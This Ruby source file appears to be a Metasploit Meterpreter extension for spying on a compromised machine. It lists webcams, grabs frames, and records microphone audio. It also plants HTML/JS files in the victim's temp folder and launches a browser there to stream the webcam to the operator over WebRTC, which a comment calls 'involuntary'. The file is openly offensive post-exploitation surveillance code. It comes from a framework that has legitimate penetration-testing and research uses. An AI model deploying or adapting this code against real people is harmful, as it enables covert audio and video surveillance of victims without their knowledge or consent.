# -*- coding: binary -*-

#require 'rex/post/meterpreter/extensions/process'

module Rex
module Post
module Meterpreter
module Extensions
module Stdapi
module Webcam

###
#
# This meterpreter extension can list and capture from webcams and/or microphone
#
###
class Webcam

  include Msf::Post::Common
  include Msf::Post::File

  def initialize(client)
    @client = client
  end

  def session
    @client
  end

  def webcam_list
    response = client.send_request(Packet.create_request('webcam_list'))
    names = []
    response.get_tlvs( TLV_TYPE_WEBCAM_NAME ).each{ |tlv|
      names << tlv.value
    }
    names
  end

  # Starts recording video from video source of index +cam+
  def webcam_start(cam)
    request = Packet.create_request('webcam_start')
    request.add_tlv(TLV_TYPE_WEBCAM_INTERFACE_ID, cam)
    client.send_request(request)
    true
  end

  def webcam_get_frame(quality)
    request = Packet.create_request('webcam_get_frame')
    request.add_tlv(TLV_TYPE_WEBCAM_QUALITY, quality)
    response = client.send_request(request)
    response.get_tlv( TLV_TYPE_WEBCAM_IMAGE ).value
  end

  def webcam_stop
    client.send_request( Packet.create_request( 'webcam_stop' )  )
    true
  end

  def chat_request
    offerer_id = 'sinn3r_offer'
    remote_browser_path = get_webrtc_browser_path
    allow_remote_webcam(remote_browser_path)
    ready_status = init_video_chat(remote_browser_path, offerer_id)
    unless ready_status
      raise RuntimeError, "Unable to find a suitable browser to initialize a WebRTC session."
    end

    #select(nil, nil, nil, 1)
    connect_video_chat(offerer_id)
  end

  # Record from default audio source for +duration+ seconds;
  # returns a low-quality wav file
  def record_mic(duration)
    request = Packet.create_request('webcam_audio_record')
    request.add_tlv(TLV_TYPE_AUDIO_DURATION, duration)
    response = client.send_request(request)
    response.get_tlv( TLV_TYPE_AUDIO_DATA ).value
  end

  attr_accessor :client


  private

  def allow_remote_webcam(browser)
    case browser
    when /chrome/i
      allow_remote_webcam_chrome
    when /firefox/i
      allow_remote_webcam_firefox
    when /opera/i
      allow_remote_webcam_opera
    end
  end

  def allow_remote_webcam_chrome
    # Modify Chrome to allow webcam by default
  end

  def allow_remote_webcam_firefox
    # Modify Firefox to allow webcam by default
  end

  def allow_remote_webcam_opera
    # Modify Opera to allow webcam by default
  end

  #
  # Returns a browser path that supports WebRTC
  #
  # @return [String]
  #
  def get_webrtc_browser_path
    found_browser_path = ''

    case client.platform
    when /win/
      drive = session.sys.config.getenv("SYSTEMDRIVE")

      [
        "Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "Program Files\\Mozilla Firefox\\firefox.exe",
        "Program Files\\Opera\\launcher.exe"
      ].each do |browser_path|
        path = "#{drive}\\#{browser_path}"
        if file?(path)
          found_browser_path = path
          break
        end
      end

    when /osx|bsd/
      [
        '/Applications/Google Chrome.app',
        '/Applications/Firefox.app',
      ].each do |browser_path|
        if file?(browser_path)
          found_browser_path = browser_path
          break
        end
      end
    when /linux|unix/
      # Need to add support for Linux
    end

    found_browser_path
  end


  #
  # Creates a video chat session as an offerer... involuntarily :-p
  #
  # @param remote_browser_path [String] A browser path that supports WebRTC on the target machine
  # @param offerer_id [String] A ID that the answerer can look for and join
  #
  def init_video_chat(remote_browser_path, offerer_id)
    interface = load_interface('offerer.html')
    api       = load_api_code

    tmp_dir = session.sys.config.getenv("TEMP")

    write_file("#{tmp_dir}\\interface.html", interface)
    write_file("#{tmp_dir}\\api.js", api)

    args = ''
    if remote_browser_path =~ /Chrome/
      # https://src.chromium.org/viewvc/chrome?revision=221000&view=revision
      # args = "--allow-file-access-from-files --disable-user-media-security --disable-web-security"

      args = "--allow-file-access-from-files"
    end

    exec_opts = {'Hidden' => false, 'Channelized' => false}
    args = "#{args} #{tmp_dir}\\interface.html"
    session.sys.process.execute(remote_browser_path, args, exec_opts)
  end


  #
  # Connects to a video chat session as an answerer
  #
  # @param offerer_id [String] The offerer's ID in order to join the video chat
  # @return void
  #
  def connect_video_chat(offerer_id)
    interface = load_interface('answerer.html')
    api       = load_api_code

    tmp_api = Tempfile.new('api.js')
    tmp_api.binmode
    tmp_api.write(api)
    tmp_api.close

    interface = interface.gsub(/\=WEBRTCAPIJS\=/, tmp_api.path)

    tmp_interface = Tempfile.new('answerer.html')
    tmp_interface.binmode
    tmp_interface.write(interface)
    tmp_interface.close

    Rex::Compat.open_webrtc_browser(tmp_interface.path)
  end


  #
  # Returns the webcam interface
  #
  # @param html_name [String] The filename of the HTML interface (offerer.html or answerer.html)
  # @return [String] The HTML interface code
  #
  def load_interface(html_name)
    interface_path = ::File.join(Msf::Config.data_directory, 'webcam', html_name)
    interface_code = ''
    ::File.open(interface_path) { |f| interface_code = f.read }
    interface_code
  end


  #
  # Returns the webcam API
  #
  # @return [String] The WebRTC lib code
  #
  def load_api_code
    js_api_path = ::File.join(Msf::Config.data_directory, 'webcam', 'api.js')
    api = ''
    ::File.open(js_api_path) { |f| api = f.read }
    api
  end

end

end; end; end; end; end; end
